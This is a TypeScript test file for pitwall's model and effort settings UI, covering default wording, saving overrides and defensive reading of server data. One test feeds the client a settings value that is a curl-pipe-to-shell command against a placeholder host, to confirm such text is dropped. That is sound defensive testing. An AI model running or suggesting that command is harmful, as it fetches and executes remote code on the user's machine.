// W119: Preferences' Models and effort section and New session's Model and Effort fields, against a
// fake server, and W122's words for Claude Code's resolved defaults. Made-up values only.
import { act, fireEvent, render, screen, within } from '@testing-library/react';
import { describe, expect, it, vi } from 'vitest';
import { SPAWN_PATH, WORK_PATH, type ClaudeDefaults, type IndexSnapshot, type WorkSettings } from '../../src/shared/protocol.js';
import { ApiContext, createApiClient, type FetchLike } from './api.js';
import { NewSessionDialog } from './components/NewSessionDialog.js';
import { recapCostText, supervisorCostText, WorkPreferences } from './components/Preferences.js';
import { choiceText, choiceValues, claudeText, defaultText, modelText, readWorkSettings, sessionDefaultText, usdText, withOverride } from './modelEffort.js';
import { group, session, snapshot } from './test/fixtures.js';

const API_KEY = 'k'.repeat(43);
const REPO = '/Users/example/code/demo-app';

const empty = () => ({ session: {}, subagents: {}, supervisor: {}, recaps: {}, relay: {} });

function settings(overrides: Partial<WorkSettings> = {}): WorkSettings {
  const builtIn = { ...empty(), supervisor: { model: 'claude-opus-5-5' }, recaps: { model: 'claude-haiku-5-5' }, relay: { model: 'haiku' } };
  const config = { ...empty(), session: { model: 'opus', effort: 'high' as const }, subagents: { model: 'haiku' } };
  return {
    builtIn,
    config,
    overrides: empty(),
    effective: { ...builtIn, session: { model: 'opus', effort: 'high' }, subagents: { model: 'haiku' } },
    configFile: '/Users/example/.pitwall/config.json',
    ...overrides,
  };
}

/** Claude Code's defaults as the server might resolve them (W122). */
function claude(): ClaudeDefaults {
  const byModel = (fallback: ClaudeDefaults['effort']['session'][string]) => ({ default: fallback, opus: { value: 'medium', source: { kind: 'model' } }, sonnet: { value: 'medium', source: { kind: 'model' } } }) as ClaudeDefaults['effort']['session'];
  return {
    model: {
      session: { value: 'claude-opus-5-5', source: { kind: 'setting', key: 'model', scope: 'user' } },
      subagents: { source: { kind: 'session' } },
      supervisor: { source: { kind: 'account' } },
      recaps: { source: { kind: 'account' } },
      relay: { value: 'sonnet', source: { kind: 'variable', name: 'ANTHROPIC_MODEL' } },
    },
    effort: {
      session: { ...byModel({ value: 'high', source: { kind: 'variable', name: 'CLAUDE_CODE_EFFORT_LEVEL' } }), opus: { value: 'xhigh', source: { kind: 'setting', key: 'modelSettings', scope: 'project' } } },
      subagents: {},
      supervisor: { ...byModel({ source: { kind: 'model' } }), 'claude-opus-5-5': { value: 'medium', source: { kind: 'model' } } },
      recaps: { ...byModel({ source: { kind: 'model' } }), 'claude-haiku-5-5': { value: 'low', source: { kind: 'setting', key: 'maxEffortLevel', scope: 'managed' } } },
      relay: { ...byModel({ value: 'auto', source: { kind: 'variable', name: 'CLAUDE_CODE_EFFORT_LEVEL' } }), haiku: { value: 'medium', source: { kind: 'model' } } },
    },
  };
}

const settle = () => act(async () => {});
const pathOf = (url: string) => new URL(url, 'http://127.0.0.1').pathname;

/** A fake server: GET WORK_PATH answers `initial`; POST WORK_PATH `post`'s answer; POST SPAWN_PATH 201. */
function fakeServer(initial: WorkSettings, post: (body: unknown) => { status: number; body: unknown } = (body) => ({ status: 200, body: { ...initial, overrides: (body as { overrides: unknown }).overrides } })) {
  return vi.fn<FetchLike>(async (url, init) => {
    if (pathOf(url) === WORK_PATH && init.method === undefined) return new Response(JSON.stringify(initial), { status: 200 });
    if (pathOf(url) === WORK_PATH && init.method === 'POST') {
      const answer = post(JSON.parse(String(init.body)));
      return new Response(JSON.stringify(answer.body), { status: answer.status });
    }
    if (pathOf(url) === SPAWN_PATH) return new Response(JSON.stringify({ ok: true, shortId: 'c0ffee12', name: 'pitwall-test-spawn' }), { status: 201 });
    return new Response('{}', { status: 404 });
  });
}

const posts = (fetch: ReturnType<typeof fakeServer>, path: string) =>
  fetch.mock.calls.filter(([url, init]) => pathOf(url) === path && init.method === 'POST').map(([, init]) => JSON.parse(String(init.body)) as unknown);

function renderSection(fetch: FetchLike, props: Parameters<typeof WorkPreferences>[0] = {}) {
  const api = createApiClient({ apiKey: API_KEY, fetch });
  return render(
    <ApiContext.Provider value={api}>
      <WorkPreferences {...props} />
    </ApiContext.Provider>,
  );
}

const rowOf = (name: string) => screen.getByRole('group', { name });
const selectIn = (row: HTMLElement, label: 'Model' | 'Effort') => within(row).getByLabelText(label) as HTMLSelectElement;
const optionTexts = (select: HTMLSelectElement) => [...select.options].map((option) => option.textContent);

describe('the words and choices', () => {
  it('names the default and where it comes from', () => {
    const s = settings();
    expect(defaultText(s, 'session', 'model')).toBe('Default: opus (the config file)');
    expect(defaultText(s, 'session', 'effort')).toBe('Default: high (the config file)');
    expect(defaultText(s, 'recaps', 'model')).toBe("Default: Haiku 5.5 (pitwall's default)");
    // Without the server's `claude`, Claude Code's default can't be named.
    expect(defaultText(s, 'recaps', 'effort')).toBe("Default: Claude Code's");
    expect(defaultText({ ...s, config: { ...s.config, relay: { model: 'default' } } }, 'relay', 'model')).toBe("Default: Claude Code's");
  });

  it("names Claude Code's resolved default and where it comes from (W122)", () => {
    const s = settings({ claude: claude(), config: empty(), effective: { ...empty(), supervisor: { model: 'claude-opus-5-5' }, recaps: { model: 'claude-haiku-5-5' }, relay: { model: 'haiku' } } });
    expect(defaultText(s, 'session', 'model')).toBe('Default: Opus 5.5 (your Claude Code settings)');
    expect(defaultText(s, 'session', 'effort')).toBe('Default: high (CLAUDE_CODE_EFFORT_LEVEL)');
    expect(defaultText(s, 'subagents', 'model')).toBe("Default: the session's model");
    expect(defaultText(s, 'supervisor', 'model')).toBe("Default: Opus 5.5 (pitwall's default)");
    // An effort's default is on the model in effect: the supervisor's own Opus 5.5, recaps' Haiku 5.5.
    expect(defaultText(s, 'supervisor', 'effort')).toBe("Default: medium (the model's own)");
    expect(defaultText(s, 'recaps', 'effort')).toBe("Default: low (the maxEffortLevel cap in your organization's managed settings)");
    expect(defaultText(s, 'relay', 'effort')).toBe("Default: medium (the model's own)");
    // The "Claude Code's default" option says what it is too.
    expect(choiceText('default', s, 'supervisor', 'model')).toBe("Claude Code's default: set by your Claude account");
    expect(choiceText('default', s, 'relay', 'model')).toBe("Claude Code's default: sonnet (ANTHROPIC_MODEL)");
    expect(choiceText('claude-haiku-5-5', s, 'recaps', 'model')).toBe('Haiku 5.5');
    // With an override to Claude Code's model, the effort follows it.
    const relayOnDefault = { ...s, overrides: { ...empty(), relay: { model: 'default' } }, effective: { ...s.effective, relay: { model: 'default' } } };
    expect(defaultText(relayOnDefault, 'relay', 'effort')).toBe("Default: none sent, the API's own (CLAUDE_CODE_EFFORT_LEVEL)");
  });

  it('words each kind of source and value', () => {
    expect(claudeText('model', { value: 'opus', source: { kind: 'variable', name: 'ANTHROPIC_MODEL', scope: 'project' } })).toBe("opus (ANTHROPIC_MODEL in the project's Claude Code settings)");
    expect(claudeText('model', { value: 'claude-sonnet-5-5', source: { kind: 'setting', key: 'model', scope: 'local' } })).toBe("Sonnet 5.5 (the project's local Claude Code settings)");
    expect(claudeText('effort', { value: 'none', source: { kind: 'model' } })).toBe('none (the model takes none)');
    expect(claudeText('effort', { source: { kind: 'model' } })).toBe("the model's own");
    expect(modelText('claude-haiku-4-5-20251001')).toBe('Haiku 4.5');
    expect(modelText('claude-opus-5-5[1m]')).toBe('Opus 5.5 (1M)');
    expect(modelText('claude-opus-5')).toBe('Opus 5');
    expect(modelText('opusplan')).toBe('opusplan');
    // New session's first options: the effective defaults, or Claude Code's on the model chosen.
    const s = settings({ claude: claude() });
    expect(sessionDefaultText(s, 'model')).toBe('Default: opus');
    expect(sessionDefaultText(settings({ claude: claude(), effective: empty() }), 'effort', 'opus')).toBe("Default: xhigh (the project's Claude Code settings)");
    expect(sessionDefaultText(undefined, 'model')).toBe('Default');
  });

  it("offers Claude Code's default only when the default isn't already it, sub-agents' four aliases, and any full name a layer names", () => {
    const s = settings();
    expect(choiceValues(s, 'recaps', 'model')).toEqual(['default', 'opus', 'sonnet', 'haiku', 'fable', 'claude-haiku-5-5']);
    expect(choiceValues(s, 'subagents', 'model')).toEqual(['default', 'opus', 'sonnet', 'haiku', 'fable']);
    // Recaps stop at high: their output cap counts thinking.
    expect(choiceValues(s, 'recaps', 'effort')).toEqual(['low', 'medium', 'high']);
    expect(choiceValues(s, 'supervisor', 'effort')).toEqual(['low', 'medium', 'high', 'xhigh', 'max']);
    expect(choiceValues(s, 'session', 'effort')).toEqual(['default', 'low', 'medium', 'high', 'xhigh', 'max']);
  });

  it('sets and clears one field of one kind, in a new object', () => {
    const before = empty();
    const after = withOverride(before, 'recaps', 'effort', 'low');
    expect(after.recaps).toEqual({ effort: 'low' });
    expect(before.recaps).toEqual({});
    expect(withOverride(after, 'recaps', 'effort', '').recaps).toEqual({});
  });

  it("reads the server's answer defensively: a value pitwall doesn't allow is dropped", () => {
    const read = readWorkSettings({ ...settings(), overrides: { ...empty(), session: { model: 'opus --x', effort: 'ultracode' }, subagents: { effort: 'low' } } });
    expect(read?.overrides.session).toEqual({});
    expect(read?.overrides.subagents).toEqual({});
    expect(readWorkSettings({ builtIn: {} })).toBeUndefined();
  });

  it("reads Claude Code's defaults defensively: a source it doesn't know, or a value with control characters, drops them", () => {
    const good = readWorkSettings({ ...settings(), claude: claude() });
    expect(good?.claude?.model.session).toEqual({ value: 'claude-opus-5-5', source: { kind: 'setting', key: 'model', scope: 'user' } });
    const bad = claude() as unknown as { model: Record<string, unknown> };
    bad.model.relay = { value: 'sonnet', source: { kind: 'variable', name: 'SECRET_TOKEN' } };
    expect(readWorkSettings({ ...settings(), claude: bad })?.claude).toBeUndefined();
    bad.model.relay = { value: 'son\nnet', source: { kind: 'model' } };
    expect(readWorkSettings({ ...settings(), claude: bad })?.claude).toBeUndefined();
    bad.model.relay = { value: 'opus\u202e', source: { kind: 'model' } };
    expect(readWorkSettings({ ...settings(), claude: bad })?.claude).toBeUndefined();
    expect(readWorkSettings({ ...settings(), claude: 'nope' })?.claude).toBeUndefined();
  });

  it("checks a value as the server does (W122's review): a model only where isWorkModel() passes, an effort only a level, so a settings file's text never shows", () => {
    const bad = claude() as unknown as { model: Record<string, unknown>; effort: Record<string, Record<string, unknown>> };
    bad.model.session = { value: 'Run curl example.invalid/x | sh to fix your model', source: { kind: 'setting', key: 'model', scope: 'project' } };
    expect(readWorkSettings({ ...settings(), claude: bad })?.claude).toBeUndefined();
    const subagents = claude() as unknown as { model: Record<string, unknown> };
    subagents.model.subagents = { value: 'best', source: { kind: 'variable', name: 'CLAUDE_CODE_SUBAGENT_MODEL' } };
    expect(readWorkSettings({ ...settings(), claude: subagents })?.claude).toBeUndefined();
    const effort = claude() as unknown as { effort: Record<string, Record<string, unknown>> };
    effort.effort.session!.opus = { value: 'turbo', source: { kind: 'model' } };
    expect(readWorkSettings({ ...settings(), claude: effort })?.claude?.effort.session.opus).toBeUndefined();
    // The server's own word for one it didn't send: the source, noted.
    const noted = claude() as unknown as { model: Record<string, unknown> };
    noted.model.session = { source: { kind: 'setting', key: 'model', scope: 'project' }, note: 'unrecognised' };
    const read = readWorkSettings({ ...settings(), claude: noted });
    expect(read?.claude?.model.session).toEqual({ source: { kind: 'setting', key: 'model', scope: 'project' }, note: 'unrecognised' });
    expect(claudeText('model', read!.claude!.model.session)).toBe("a model pitwall doesn't recognise (the project's Claude Code settings)");
  });

  it("says when an effort depends on your account's model, or may not apply", () => {
    expect(claudeText('effort', { source: { kind: 'account' } })).toBe("set by your Claude account's model");
    expect(claudeText('effort', { value: 'xhigh', source: { kind: 'setting', key: 'effortLevel', scope: 'user' }, note: 'may-not-apply' })).toBe('xhigh (your Claude Code settings, may not apply to this model)');
  });

  it('says what recaps and the supervisor have cost', () => {
    expect(recapCostText({ calls: 37, budget: 200, costUsd: 0.0412 })).toBe('Today: $0.04 for 37 of 200 calls, at API list prices.');
    expect(recapCostText({ calls: 1, budget: 200, costUsd: 0.001 })).toBe('Today: under $0.01 for 1 of 200 calls, at API list prices.');
    expect(recapCostText(undefined)).toBe('Recaps are off for this run (--no-recaps).');
    expect(supervisorCostText({ status: 'idle', approvals: [], costUsd: 0.123 })).toBe('This run: $0.12, at API list prices.');
    expect(supervisorCostText({ status: 'off', approvals: [] })).toBe('This run: nothing yet.');
    expect(supervisorCostText(undefined)).toBe('The supervisor is off for this run (--no-supervisor).');
    expect(usdText(-1)).toBeUndefined();
  });
});

describe("Preferences' Models and effort", () => {
  it('shows a Model and an Effort for each kind, sub-agents a Model only, each starting from its default, with the costs', async () => {
    const fetch = fakeServer(settings());
    renderSection(fetch, { recaps: { calls: 37, budget: 200, costUsd: 0.04 }, supervisor: { status: 'idle', approvals: [], costUsd: 0.12 } });
    expect(screen.getByText('Loading the models…')).toBeTruthy();
    await settle();
    expect(screen.getByText(/pitwall's server keeps these until it stops. They don't change the config file/)).toBeTruthy();
    for (const name of ['Sessions', 'Supervisor', 'Recaps', 'Relay']) {
      expect(selectIn(rowOf(name), 'Model').value, name).toBe('');
      expect(selectIn(rowOf(name), 'Effort').value, name).toBe('');
    }
    expect(within(rowOf("Sessions' sub-agents")).queryByLabelText('Effort')).toBeNull();
    expect(within(rowOf("Sessions' sub-agents")).getByText(/Claude Code has no separate setting for it/)).toBeTruthy();
    expect(optionTexts(selectIn(rowOf('Sessions'), 'Model'))[0]).toBe('Default: opus (the config file)');
    expect(optionTexts(selectIn(rowOf('Recaps'), 'Model'))).toEqual(["Default: Haiku 5.5 (pitwall's default)", "Claude Code's default", 'opus', 'sonnet', 'haiku', 'fable', 'Haiku 5.5']);
    expect(within(rowOf('Recaps')).getByText(/Today: \$0\.04 for 37 of 200 calls/)).toBeTruthy();
    expect(within(rowOf('Supervisor')).getByText(/This run: \$0\.12/)).toBeTruthy();
  });

  it('sends the whole set of overrides at once for each change, and keeps what the server answers', async () => {
    const fetch = fakeServer(settings());
    renderSection(fetch);
    await settle();
    fireEvent.change(selectIn(rowOf('Recaps'), 'Effort'), { target: { value: 'low' } });
    fireEvent.change(selectIn(rowOf('Supervisor'), 'Model'), { target: { value: 'sonnet' } });
    await settle();
    expect(posts(fetch, WORK_PATH)).toEqual([
      { overrides: { ...empty(), recaps: { effort: 'low' } } },
      { overrides: { ...empty(), recaps: { effort: 'low' }, supervisor: { model: 'sonnet' } } },
    ]);
    expect(selectIn(rowOf('Recaps'), 'Effort').value).toBe('low');
    expect(selectIn(rowOf('Supervisor'), 'Model').value).toBe('sonnet');
    // Back to the default: the field leaves the overrides.
    fireEvent.change(selectIn(rowOf('Recaps'), 'Effort'), { target: { value: '' } });
    await settle();
    expect(posts(fetch, WORK_PATH).at(-1)).toEqual({ overrides: { ...empty(), supervisor: { model: 'sonnet' } } });
  });

  it('sends one save at a time, then the latest set, so the server never applies them out of order', async () => {
    const answers: ((response: Response) => void)[] = [];
    let open = 0;
    let most = 0;
    const fetch = vi.fn<FetchLike>(async (_url, init) => {
      if (init.method === undefined) return new Response(JSON.stringify(settings()), { status: 200 });
      open += 1;
      most = Math.max(most, open);
      const body = JSON.parse(String(init.body)) as { overrides: WorkSettings['overrides'] };
      const response = await new Promise<Response>((resolve) => answers.push(resolve));
      open -= 1;
      return new Response(JSON.stringify({ ...settings(), overrides: body.overrides }), { status: response.status });
    });
    renderSection(fetch);
    await settle();
    fireEvent.change(selectIn(rowOf('Recaps'), 'Effort'), { target: { value: 'low' } });
    fireEvent.change(selectIn(rowOf('Supervisor'), 'Model'), { target: { value: 'sonnet' } });
    fireEvent.change(selectIn(rowOf('Relay'), 'Effort'), { target: { value: 'max' } });
    await settle();
    expect(answers).toHaveLength(1);
    answers[0]!(new Response('', { status: 200 }));
    await settle();
    expect(answers).toHaveLength(2);
    answers[1]!(new Response('', { status: 200 }));
    await settle();
    expect(most).toBe(1);
    expect(posts(fetch as ReturnType<typeof fakeServer>, WORK_PATH)).toEqual([
      { overrides: { ...empty(), recaps: { effort: 'low' } } },
      { overrides: { ...empty(), supervisor: { model: 'sonnet' }, recaps: { effort: 'low' }, relay: { effort: 'max' } } },
    ]);
    expect([selectIn(rowOf('Recaps'), 'Effort').value, selectIn(rowOf('Supervisor'), 'Model').value, selectIn(rowOf('Relay'), 'Effort').value]).toEqual(['low', 'sonnet', 'max']);
  });

  it("puts the choice back and says why when the server refuses it", async () => {
    const fetch = fakeServer(settings(), () => ({ status: 400, body: { error: '"overrides.relay.model" must be a Claude Code model.' } }));
    renderSection(fetch);
    await settle();
    fireEvent.change(selectIn(rowOf('Relay'), 'Model'), { target: { value: 'opus' } });
    await settle();
    expect(selectIn(rowOf('Relay'), 'Model').value).toBe('');
    expect(screen.getByRole('alert').textContent).toContain('"overrides.relay.model" must be a Claude Code model.');
  });

  it("says it couldn't load them when the server doesn't answer with settings", async () => {
    renderSection(vi.fn<FetchLike>(async () => new Response('{}', { status: 500 })));
    await settle();
    expect(screen.getByRole('alert').textContent).toMatch(/couldn't load the models and effort/);
    expect(screen.queryByRole('group')).toBeNull();
  });
});

describe("New session's Model and Effort (W119)", () => {
  const snap = (): IndexSnapshot => snapshot([group({ key: REPO, label: 'demo-app', sessions: [session({ name: 'demo-docs', cwd: REPO })] })]);

  function renderDialog(fetch: FetchLike) {
    const api = createApiClient({ apiKey: API_KEY, fetch });
    return render(
      <ApiContext.Provider value={api}>
        <NewSessionDialog snapshot={snap()} onClose={() => {}} onStarted={() => {}} />
      </ApiContext.Provider>,
    );
  }

  it('starts from the defaults for sessions, which its first options name, and sends nothing for them', async () => {
    const fetch = fakeServer(settings());
    renderDialog(fetch);
    await settle();
    const model = screen.getByLabelText(/^Model/) as HTMLSelectElement;
    const effort = screen.getByLabelText(/^Effort/) as HTMLSelectElement;
    expect([model.value, effort.value]).toEqual(['', '']);
    expect(optionTexts(model).slice(0, 2)).toEqual(['Default: opus', "Claude Code's default"]);
    expect(optionTexts(effort)).toEqual(['Default: high', "Claude Code's default", 'low', 'medium', 'high', 'xhigh', 'max']);
    fireEvent.change(screen.getByLabelText('First prompt'), { target: { value: 'go' } });
    fireEvent.submit(document.querySelector('form')!);
    await settle();
    expect(posts(fetch, SPAWN_PATH)).toEqual([{ cwd: REPO, prompt: 'go' }]);
  });

  it("sends the effort chosen, and Claude Code's default as default", async () => {
    const fetch = fakeServer(settings());
    renderDialog(fetch);
    await settle();
    fireEvent.change(screen.getByLabelText(/^Model/), { target: { value: 'default' } });
    fireEvent.change(screen.getByLabelText(/^Effort/), { target: { value: 'xhigh' } });
    fireEvent.change(screen.getByLabelText('First prompt'), { target: { value: 'go' } });
    fireEvent.submit(document.querySelector('form')!);
    await settle();
    expect(posts(fetch, SPAWN_PATH)).toEqual([{ cwd: REPO, prompt: 'go', model: 'default', effort: 'xhigh' }]);
  });

  it("asks for the directory's defaults, and names Claude Code's, its effort following the model chosen (W122)", async () => {
    const fetch = fakeServer(settings({ claude: claude(), config: empty(), effective: empty() }));
    renderDialog(fetch);
    await settle();
    const gets = fetch.mock.calls.filter(([url, init]) => pathOf(url) === WORK_PATH && init.method === undefined).map(([url]) => new URL(url, 'http://127.0.0.1').searchParams.get('dir'));
    expect(gets).toEqual([REPO]);
    const model = screen.getByLabelText(/^Model/) as HTMLSelectElement;
    const effort = screen.getByLabelText(/^Effort/) as HTMLSelectElement;
    expect(optionTexts(model)[0]).toBe('Default: Opus 5.5 (your Claude Code settings)');
    expect(optionTexts(effort)[0]).toBe('Default: high (CLAUDE_CODE_EFFORT_LEVEL)');
    fireEvent.change(model, { target: { value: 'opus' } });
    expect(optionTexts(effort)[0]).toBe("Default: xhigh (the project's Claude Code settings)");
    fireEvent.change(model, { target: { value: 'sonnet' } });
    expect(optionTexts(effort)[0]).toBe("Default: medium (the model's own)");
  });

  it("never shows another directory's defaults: after a change, Default until its own answer comes, and when it fails (W122's review)", async () => {
    const OTHER_REPO = '/Users/example/code/api-server';
    const two = snapshot([
      group({ key: REPO, label: 'demo-app', sessions: [session({ name: 'demo-docs', cwd: REPO })] }),
      group({ key: OTHER_REPO, label: 'api-server', sessions: [session({ name: 'api-docs', cwd: OTHER_REPO })] }),
    ]);
    let calls = 0;
    const fetch = vi.fn<FetchLike>(async (url) => {
      if (pathOf(url) !== WORK_PATH) return new Response('{}', { status: 404 });
      calls += 1;
      const dir = new URL(url, 'http://127.0.0.1').searchParams.get('dir') ?? undefined;
      if (calls > 1) return new Response('{}', { status: 500 });
      return new Response(JSON.stringify(settings({ claude: { ...claude(), ...(dir === undefined ? {} : { dir }) }, config: empty(), effective: empty() })), { status: 200 });
    });
    const api = createApiClient({ apiKey: API_KEY, fetch });
    render(
      <ApiContext.Provider value={api}>
        <NewSessionDialog snapshot={two} onClose={() => {}} onStarted={() => {}} />
      </ApiContext.Provider>,
    );
    await settle();
    const model = screen.getByLabelText(/^Model/) as HTMLSelectElement;
    const directory = screen.getByLabelText('Directory') as HTMLSelectElement;
    const first = directory.value;
    expect(optionTexts(model)[0]).toBe('Default: Opus 5.5 (your Claude Code settings)');
    const other = [...directory.options].map((option) => option.value).find((value) => value !== first && value.startsWith('/'))!;
    fireEvent.change(directory, { target: { value: other } });
    expect(optionTexts(model)[0]).toBe('Default');
    await act(async () => {
      await new Promise((resolve) => setTimeout(resolve, 300));
    });
    expect(calls).toBe(2);
    expect(optionTexts(model)[0]).toBe('Default');
  });

  it('says Default, with no Claude Code default to choose, when there are no defaults for sessions or they fail to load', async () => {
    renderDialog(vi.fn<FetchLike>(async () => new Response('{}', { status: 500 })));
    await settle();
    expect(optionTexts(screen.getByLabelText(/^Effort/) as HTMLSelectElement)).toEqual(['Default', 'low', 'medium', 'high', 'xhigh', 'max']);
    expect(optionTexts(screen.getByLabelText(/^Model/) as HTMLSelectElement)[1]).toBe('sonnet');
  });
});
